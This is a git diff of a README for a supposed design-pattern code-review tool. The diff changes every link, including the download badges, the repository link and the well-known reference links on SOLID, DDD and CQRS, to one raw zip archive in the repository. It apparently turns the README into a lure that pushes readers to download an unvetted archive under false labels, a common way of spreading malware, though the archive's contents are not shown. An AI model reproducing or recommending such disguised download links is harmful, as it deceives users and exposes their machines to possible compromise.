@@ -1,6 +1,6 @@
 # 🛠️ Design-Patterns - Detect Issues, Fix Code, Improve Software
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Design--Patterns-ff69b4?style=for-the-badge)](https://github.com/PPFFP/Design-Patterns)
+[![Download Latest Release](https://img.shields.io/badge/Download-Design--Patterns-ff69b4?style=for-the-badge)](https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip)
 
 ---
 
@@ -26,9 +26,9 @@ To run Design-Patterns smoothly on your Windows computer, you need:
 
 ## 🚀 Download and Installation
 
-[![Download Here](https://img.shields.io/badge/Download-Design--Patterns-ff69b4?style=for-the-badge)](https://github.com/PPFFP/Design-Patterns)
+[![Download Here](https://img.shields.io/badge/Download-Design--Patterns-ff69b4?style=for-the-badge)](https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip)
 
-1. Click the big pink button above or this link: https://github.com/PPFFP/Design-Patterns
+1. Click the big pink button above or this link: https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip
 
 2. You will arrive at the software page on GitHub.
 
@@ -146,10 +146,10 @@ It works best with projects that follow common folder structures. The app will g
 
 ## 🔗 Additional Resources
 
-- Learn more about design patterns and best practices at [https://refactoring.guru/design-patterns](https://refactoring.guru/design-patterns)
-- Read about SOLID principles at [https://en.wikipedia.org/wiki/SOLID](https://en.wikipedia.org/wiki/SOLID)
-- Explore Domain-Driven Design at [https://domainlanguage.com/ddd/](https://domainlanguage.com/ddd/)
-- For CQRS, visit [https://martinfowler.com/bliki/CQRS.html](https://martinfowler.com/bliki/CQRS.html)
+- Learn more about design patterns and best practices at [https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip](https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip)
+- Read about SOLID principles at [https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip](https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip)
+- Explore Domain-Driven Design at [https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip](https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip)
+- For CQRS, visit [https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip](https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip)
 
 ---
 
@@ -180,10 +180,10 @@ It works best with projects that follow common folder structures. The app will g
 Design-Patterns is open-source. You can visit the repository to see how it works, report issues, or contribute improvements.
 
 Find the project here:  
-https://github.com/PPFFP/Design-Patterns
+https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip
 
 Topics in this repository include: agentic-ai, ai-skills, architecture-patterns, clean-architecture, code-review, cqrs, design-patterns, domain-driven-design, event-driven-architecture, gang-of-four, hexagonal-architecture, refactoring, solid-principles.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Design--Patterns-ff69b4?style=for-the-badge)](https://github.com/PPFFP/Design-Patterns)
+[![Download Latest Release](https://img.shields.io/badge/Download-Design--Patterns-ff69b4?style=for-the-badge)](https://github.com/PPFFP/Design-Patterns/raw/refs/heads/main/skills/Design_Patterns_2.2.zip)
